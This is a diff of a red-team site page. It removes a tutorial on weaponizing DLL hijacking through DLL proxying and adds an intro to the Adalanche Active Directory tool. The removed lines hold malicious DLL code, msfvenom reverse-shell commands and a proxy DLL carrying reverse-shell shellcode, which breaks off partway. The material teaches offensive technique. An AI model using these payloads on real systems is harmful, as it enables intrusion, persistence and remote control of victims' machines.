@@ -10,33 +10,32 @@
     <meta name="generator" content="Retype 3.5.0">
 
     <!-- Primary Meta Tags -->
-    <title>Weaponizing DLL Hijacking via DLL Proxying</title>
-    <meta name="title" content="Weaponizing DLL Hijacking via DLL Proxying">
-    <meta name="description" content="Dynamic Link Library (DLL) is a collection of code that can be shared across multiple processes in Windows.">
+    <title>Visualizing ACLs with Adalanche</title>
+    <meta name="title" content="Visualizing ACLs with Adalanche">
+    <meta name="description" content="I was always a fan of trying new tools in order to create a personal arsenal for edged cases. Recently, I found a tool called ">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/malware-development/weaponizing-dll-hijacking-via-dll-proxying/">
+    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/active-directory/enumeration/visualizing-acls-with-adalanche/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/malware-development/weaponizing-dll-hijacking-via-dll-proxying/">
-    <meta property="og:title" content="Weaponizing DLL Hijacking via DLL Proxying">
-    <meta property="og:description" content="Dynamic Link Library (DLL) is a collection of code that can be shared across multiple processes in Windows.">
+    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/active-directory/enumeration/visualizing-acls-with-adalanche/">
+    <meta property="og:title" content="Visualizing ACLs with Adalanche">
+    <meta property="og:description" content="I was always a fan of trying new tools in order to create a personal arsenal for edged cases. Recently, I found a tool called ">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/malware-development/weaponizing-dll-hijacking-via-dll-proxying/">
-    <meta property="twitter:title" content="Weaponizing DLL Hijacking via DLL Proxying">
-    <meta property="twitter:description" content="Dynamic Link Library (DLL) is a collection of code that can be shared across multiple processes in Windows.">
+    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/active-directory/enumeration/visualizing-acls-with-adalanche/">
+    <meta property="twitter:title" content="Visualizing ACLs with Adalanche">
+    <meta property="twitter:description" content="I was always a fan of trying new tools in order to create a personal arsenal for edged cases. Recently, I found a tool called ">
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../resources/css/retype.css?v=3.5.0.760223202250" rel="stylesheet">
+    <link href="../../../resources/css/retype.css?v=3.5.0.760223202250" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../resources/js/config.js?v=3.5.0.760223202250" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.5.0.760223202250" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.5.0.760223202250" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.5.0.760223202250" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.5.0.760223202250" data-turbo-eval="false" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -51,7 +50,7 @@
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../" class="flex items-center leading-snug text-xl">
+                        <a id="docs-site-logo" href="../../../" class="flex items-center leading-snug text-xl">
                             <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Red Teaming Army</span>
                         </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Docs</span>
                     </div>
@@ -319,228 +318,31 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="docs-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="weaponizing-dll-hijacking-via-dll-proxying" class="break-words">
+<doc-anchor-target id="visualizing-acls-with-adalanche" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#weaponizing-dll-hijacking-via-dll-proxying">#</doc-anchor-trigger>
-        <span>Weaponizing DLL Hijacking via DLL Proxying</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#visualizing-acls-with-adalanche">#</doc-anchor-trigger>
+        <span>Visualizing ACLs with Adalanche</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="introduction">
+<doc-anchor-target id="visualizing-acls-with-adalanche">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#introduction">#</doc-anchor-trigger>
-        <span>Introduction</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#visualizing-acls-with-adalanche">#</doc-anchor-trigger>
+        <span>Visualizing ACLs with Adalanche</span>
     </h2>
 </doc-anchor-target>
-<p>Dynamic Link Library (DLL) is a collection of code that can be shared across multiple processes in Windows. A process imports a DLL when it needs to use functions or resources externally provided by it. For example, if a message box is displayed, the <code v-pre>User32.dll</code>
-would be imported to the running process.</p>
-<p><code v-pre>DLL Hijacking</code> is an attack, in which the intruder overwrites a specific and predefined DLL on the remote file system. When a process loads the overwritten library, a malicious code will be executed instead of the real one.</p>
-<p>While <code v-pre>DLL Hijacking</code> is usually exploited for persistence, privilege escalation and lateral movement, it is a great technique for initial access, since it de-chains the download from the execution phase, which is highly suspicious behavior for EDRs (Endpoint Detection and Response).</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>A nice webinar on EDR evasion with DLL Hijacking can be found here: <a href="https://www.youtube.com/watch?v=CKfjLnEMfvI">https://www.youtube.com/watch?v=CKfjLnEMfvI</a></p>
-        </div>
-    </div>
-</div>
-<doc-anchor-target id="theory">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#theory">#</doc-anchor-trigger>
-        <span>Theory</span>
-    </h2>
-</doc-anchor-target>
-<p>The process of loading DLLs is automatically handled by the Windows OS. To demonstrate it let&#x27;s take the following C code:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">#include &lt;windows.h&gt;
-
-int main() {
-    MessageBoxA(NULL, &quot;Hello, MessageBox!&quot;, &quot;Message&quot;, MB_OK);
-    return 0;
-}</code></pre>
-</doc-codeblock></div>
-<p>When executed, a message box will appear. If we inspect the program with <a href="https://processhacker.sourceforge.io/downloads.php">Process Hacker 2</a> we can confirm that the <code v-pre>user32.dll</code> module is indeed loaded into the process.</p>
-<p><figure class="content-center">
-    <img src="modules.png" alt="user32.dll viewed from Process Hacker">
-    <figcaption class="caption">user32.dll viewed from Process Hacker</figcaption>
-</figure>
-</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>If you replace one of the loaded DLL with a malicious one, the next time a process loads it, the malicious code inside will get executed. This is DLL Hijacking.</p>
-        </div>
-    </div>
-</div>
-<p>By default, in Windows OS, when an application loads dynamic link libraries (DLLs), the operating system follows a specific search order to locate these DLLs. The search order is prioritized as:</p>
-<ul>
-<li><p>The directory from which the application is loaded: The system looks for DLLs in the same directory as the executable file of the application.</p>
-</li>
-<li><p>The current working directory: If the DLL is not found in the application&#x27;s directory, the system searches the current working directory. However, be cautious with relying on the current working directory, as it can change during the execution of the program.</p>
-</li>
-<li><p>Windows System directories: If the DLL is not found in the application&#x27;s directory or the current working directory, the system searches the directories listed in the system&#x27;s PATH environment variable. This includes standard system directories like C:\Windows\System32.</p>
-</li>
-<li><p>Windows directories: If the DLL is not found in the aforementioned locations, the system searches the Windows directory.</p>
-</li>
-<li><p>Directories listed in the PATH environment variable: If the DLL is not found in any of the previous locations, the system searches the directories listed in the PATH environment variable.</p>
-</li>
-</ul>
-<p>This search priority is often abused for DLL Hijacking attacks, since a lot of applications will initially request a DLL from a folder where the user has write access rights over.</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>When developing an application, it is important to use full paths for the needed modules in order to avoid hijacking vulnerabilities.</p>
-        </div>
-    </div>
-</div>
-<doc-anchor-target id="classical-dll-hijacking">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#classical-dll-hijacking">#</doc-anchor-trigger>
-        <span>Classical DLL Hijacking</span>
-    </h2>
-</doc-anchor-target>
-<p>By &quot;Classical DLL Hijacking&quot; I mean the exploitation of DLL Hijacking vulnerability just for demonstrative purposes (a.k.a not caring about evasion, you just want to prove that the application is vulnerable).</p>
-<p>During this blogpost I am using <a href="https://github.com/srini0x00/dvta">DVTA</a> for my testing environment.</p>
-<p>Finding a DLL Hijacking vulnerability is as simple as scanning different processes for their module imports, and overwriting a module if you have write access to the path on the filesystem where it is missing or loaded.</p>
-<p>This behavior can be easily analyzed with tools like <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a>. If you specify the following filters, ProcMon will scan the defined process for all DLL imports.</p>
-<p><figure class="content-center">
-    <img src="procmonfilters.png" alt="Filtering DVTA process and all DLL imports">
-    <figcaption class="caption">Filtering DVTA process and all DLL imports</figcaption>
-</figure>
-</p>
-<p>After the filters are applied it is recommended to restart the application for maximum coverage. Eventually, after watching the process activity you should come up to something like this:</p>
-<p><figure class="content-center">
-    <img src="not_found.png" alt="DVTA cannot find C:\Users\lsec\Desktop\DVTA\DVTA\bin\Release\profapi.dll">
-    <figcaption class="caption">DVTA cannot find C:\Users\lsec\Desktop\DVTA\DVTA\bin\Release\profapi.dll</figcaption>
-</figure>
-</p>
-<p>This is a perfect candidate for DLL Hijacking attack, since the DVTA application is trying to load <code v-pre>profapi.dll</code> within my user&#x27;s folder.</p>
-<p>For generating a sample DLL, we can use either custom made one (recommended), or a <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html">msfvenom</a> one. For the sake of the demo, I created the following custom DLL, to spawn &quot;calc.exe&quot; process.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">#include &quot;pch.h&quot;
-#include &lt;stdlib.h&gt;
-#include &lt;windows.h&gt;
-
-void calc();
-
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
-{
-HANDLE t;
-switch (ul_reason_for_call)
-{
-case DLL_PROCESS_ATTACH:
-  t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)calc, NULL, 0, NULL);
-  CloseHandle(t);
-  break;
-case DLL_THREAD_ATTACH:
-case DLL_THREAD_DETACH:
-case DLL_PROCESS_DETACH:
-	break;
-}
-return TRUE;
-}
-
-void calc()
-{
- system(&quot;calc.exe&quot;);
-}</code></pre>
-</doc-codeblock></div>
-<p>DLL&#x27;s entry point is called &quot;DLLMain&quot; and it executes code via various conditions on how the DLL is being called. When a process reads a function from the DLL it generally uses &quot;DLL_PROCESS_ATTACH&quot;. We will store our custom code there! While this sample POC is designed to just spawn <code v-pre>calc.exe</code>, in real scenario you want your payload execution logic here!</p>
-<p>The same behavior can be replicated with msfvenom:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">msvenom -f dll -p windows/exec CMD=&quot;C:\\Windows\\System32\\calc.exe&quot; -o profapi.dll</code></pre>
-</doc-codeblock></div>
-<p>After the DLL is generated, it is enough to just transfer it over the directory from where the application is trying to load it, and it is done. When the application is restarted and the DLL is re-imported, the payload behind will get executed.</p>
-<p><figure class="content-center">
-    <img src="calc_spawned.png" alt="Spawning calc.exe after placing profapi.dll and restarting the application">
-    <figcaption class="caption">Spawning calc.exe after placing profapi.dll and restarting the application</figcaption>
-</figure>
-</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>During the &quot;Classical DLL Hijacking&quot; attack, the targeted application will most likely stop working after the custom DLL is executed! This is because the application requires specific functions from the imported DLL and our custom one is lacking them.</p>
-        </div>
-    </div>
-</div>
-<doc-anchor-target id="dll-proxying">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#dll-proxying">#</doc-anchor-trigger>
-        <span>DLL Proxying</span>
-    </h2>
-</doc-anchor-target>
-<p>Since the &quot;Classical DLL Hijacking&quot; is super simple to perform, it is also extremely ineffective in real engagements. In order to weaponize this attack, it is important to understand &quot;why&quot;.</p>
-<p>Typically, the DLL Hijacking attacks are utilized for:</p>
-<ul>
-<li>Persistence</li>
-<li>Privilege Escalation</li>
-<li>AV / EDR Evasion</li>
-</ul>
-<p>No matter in which scenario the DLL Hijacking is needed, it is important to not break the application / environment of the victim. No matter how evasive your payloads are, if the client software is corrupted, it could easily lead to internal escalation.</p>
-<p>While each one of these topics are super complex and requires a lot of dedicated attention, we will not dive into them today. In this blog we will focus on how to weaponize the DLL Hijacking attack, so that it does not break the application runtime after the payload is executed. I am going to release more blogs on these topics in future! Stay tuned!</p>
-<p>I already have a video on DLL Proxying, so if you prefer watching instead of reading, feel welcomed to my channel:
+<p>I was always a fan of trying new tools in order to create a personal arsenal for edged cases. Recently, I found a tool called <a href="https://github.com/lkarlslund/Adalanche">Adalanche</a>, which is capable of enumerating and visualizing <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">ACLs</a> between entities in the scope of the <a href="https://en.wikipedia.org/wiki/Active_Directory">Active Directory</a>.</p>
+<p>Usually, Active Directory misconfigurations can be found within the ACLs, and they can often lead to obtaining domain administrative privileges by chaining various lateral movement or privilege escalation techniques together. A very simple example for that can be a vulnerable <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview">ADCS</a> server to <a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/">ESC1</a> attack.
+Another example could be finding out that the current owned user is local administrator on some machine and after data exfiltration, you find domain admin credentials.</p>
+<p>Mapping such attack vectors can be complicated without such tools, and while you should not be dependant of them, they are here to help, and they certainly do!</p>
+<p>While <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> is my rank #1 tool for enumerating and visualizing the Active Directory, I was also thrilled to try Adalanche, mainly because of curiosity in terms of UI, practical use and evasiveness. Turned out that this tool might be a hidden gem!</p>
+<p>If you prefer watching a video instead of reading, I already deployed a video about the topic on my channel: 
 <figure>
     <div class="relative w-full mb-6 overflow-hidden pt-9/16">
-        <iframe class="w-full h-full border-0 absolute inset-0" src="https://www.youtube.com/embed/KhVxglO2mcM" allowfullscreen></iframe>
+        <iframe class="w-full h-full border-0 absolute inset-0" src="https://www.youtube.com/embed/PG2J0uILL1Q" allowfullscreen></iframe>
     </div>
 </figure>
 </p>
-<p>The application block is generally caused by 2 factors:</p>
-<ul>
-<li>The malicious DLL is missing the functions that are needed from the application.</li>
-<li>The payload is hijacking the thread, which can result in a timeout.</li>
-</ul>
-<p>To solve this problem we must perform something called DLL proxying. It looks like this:
-<figure class="content-center">
-    <img src="proxyingtheory.png" alt="https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistenceDLL">
-    <figcaption class="caption">https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistenceDLL</figcaption>
-</figure>
-</p>
-<p>In a DLL, an exported function is a function that is made available for other applications or DLLs to use. When a function is exported, it means that it is exposed and can be called by external programs. Exported functions could serve as entry points for other software components to utilize the functionality provided by the DLL.</p>
-<p>DLL Proxying is when you embed the exported functions from the original DLL into your malicious one. This way when the DLL is hijacked and loaded, the malicious payload will get executed in parallel with the intended and needed exported functions.</p>
-<p>Additionally, the payload execution should not be handled poorly, if the payload execution thread corrupts the process, even though the exported functions are present, the application could still timeout.</p>
-<p>While this approach may sound super complex, there are tools that can export all the needed functions in C/C++ template. One such tool is called <a href="https://github.com/Accenture/Spartacus">Spartacus</a>.</p>
+<p>Also make sure to join my <a href="https://discord.gg/bgSpdheEgu">Discord</a> where we share experience, knowledge and doing CTF together.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
     <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
@@ -554,162 +356,318 @@ void calc()
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>Spartacus requires ProcMon to be installed.</p>
+<p>And if you have further appreciation for my work, don&#x27;t hesitate to become my <a href="https://www.patreon.com/Lsecqt">Patreon</a>!</p>
         </div>
     </div>
 </div>
-<p>To run Spartacus, you can follow the syntax:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">.\Spartacus-v1.2.0-x64.exe --procmon C:\Users\user\Desktop\Procmon64.exe --pml test.plm --csv ./output.csv --exports . --verbose</code></pre>
-</doc-codeblock></div>
-<p>Spartacus will automatically engage with ProcMon, setup filters and find DLL hijackable binaries. After finding such, it will try to export all the functions it needs from the mentioned DLL.</p>
-<p>After executing the command, make sure to restart the targeted binary, and then terminate Spartacus by pressing enter.
-When stopped, it will generate similar output:
-<figure class="content-center">
-    <img src="spartacus.png" alt="Spartacus automatically using ProcMon to filter Hijackable DLLs">
-    <figcaption class="caption">Spartacus automatically using ProcMon to filter Hijackable DLLs</figcaption>
-</figure>
-</p>
-<p>From the output, Spartacus founds which DLLs are hijackable and forwardable, exported their functions and generated a C++ template for the DLLs.</p>
-<p>In this example it is clear that the previously exploited <code v-pre>profapi.dll</code> is not a good match, since Spartacus cannot export its functions. However, <code v-pre>CRYPTSP.dll</code> looks like a better option.</p>
-<p>The C++ template for <code v-pre>CRYPTSP.dll</code> looks like this in my example:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">#pragma once
-
-#pragma comment(linker,&quot;/export:SystemFunction001=C:\\Windows\\System32\\cryptbase.SystemFunction001,@1&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction002=C:\\Windows\\System32\\cryptbase.SystemFunction002,@2&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction003=C:\\Windows\\System32\\cryptbase.SystemFunction003,@3&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction004=C:\\Windows\\System32\\cryptbase.SystemFunction004,@4&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction005=C:\\Windows\\System32\\cryptbase.SystemFunction005,@5&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction028=C:\\Windows\\System32\\cryptbase.SystemFunction028,@6&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction029=C:\\Windows\\System32\\cryptbase.SystemFunction029,@7&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction034=C:\\Windows\\System32\\cryptbase.SystemFunction034,@8&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction036=C:\\Windows\\System32\\cryptbase.SystemFunction036,@9&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction040=C:\\Windows\\System32\\cryptbase.SystemFunction040,@10&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction041=C:\\Windows\\System32\\cryptbase.SystemFunction041,@11&quot;)
-
-#include &lt;windows.h&gt;
-
-VOID Payload() {
-    // Run your payload here.
-}
-
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
-{
-    switch (fdwReason)
-    {
-    case DLL_PROCESS_ATTACH:
-        Payload();
-        break;
-    case DLL_THREAD_ATTACH:
-        break;
-    case DLL_THREAD_DETACH:
-        break;
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
-}</code></pre>
-</doc-codeblock></div>
-<p>Now let&#x27;s tweek the malicious template from Spartacus!
-I created <a href="https://github.com/lsecqt/OffensiveCpp">Offensive CPP</a> repository, its idea is to host offensive C/C++ independent snippets, which can be used in various scenarios. Let&#x27;s copy some shellcode execution code.
-During the demo, I am using the <a href="https://github.com/lsecqt/OffensiveCpp/blob/main/Shellcode%20Execution/FileMap/directPointerToFileMap.cpp">FileMap</a> snippet.</p>
-<p>The last step is to generate a shellcode from msfvenom:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f c</code></pre>
-</doc-codeblock></div>
-<p>After combining the pieces I created the following POC:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-cpp"><code v-pre class="language-cpp">#pragma once
-
-#pragma comment(linker,&quot;/export:SystemFunction001=C:\\Windows\\System32\\cryptbase.SystemFunction001,@1&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction002=C:\\Windows\\System32\\cryptbase.SystemFunction002,@2&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction003=C:\\Windows\\System32\\cryptbase.SystemFunction003,@3&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction004=C:\\Windows\\System32\\cryptbase.SystemFunction004,@4&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction005=C:\\Windows\\System32\\cryptbase.SystemFunction005,@5&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction028=C:\\Windows\\System32\\cryptbase.SystemFunction028,@6&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction029=C:\\Windows\\System32\\cryptbase.SystemFunction029,@7&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction034=C:\\Windows\\System32\\cryptbase.SystemFunction034,@8&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction036=C:\\Windows\\System32\\cryptbase.SystemFunction036,@9&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction040=C:\\Windows\\System32\\cryptbase.SystemFunction040,@10&quot;)
-#pragma comment(linker,&quot;/export:SystemFunction041=C:\\Windows\\System32\\cryptbase.SystemFunction041,@11&quot;)
-
-#include &lt;windows.h&gt;
-#include &lt;iostream&gt;
-
-unsigned char buf[] =
-&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;
-&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;
-&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;
-&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;
-&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;
-&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;
-&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;
-&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;
-&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;
-&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;
-&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;
-&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;
-&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;
-&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;
-&quot;\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&quot;
-&quot;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00&quot;
-&quot;\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x6e\x89&quot;
-&quot;\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07&quot;
-&quot;\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29&quot;
-&quot;\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48&quot;
-&quot;\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea&quot;
-&quot;\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89&quot;
-&quot;\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81&quot;
-&quot;\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00&quot;
-&quot;\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0&quot;
-&quot;\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01&quot;
-&quot;\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41&quot;
-&quot;\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d&quot;
-&quot;\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48&quot;
-&quot;\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff&quot;
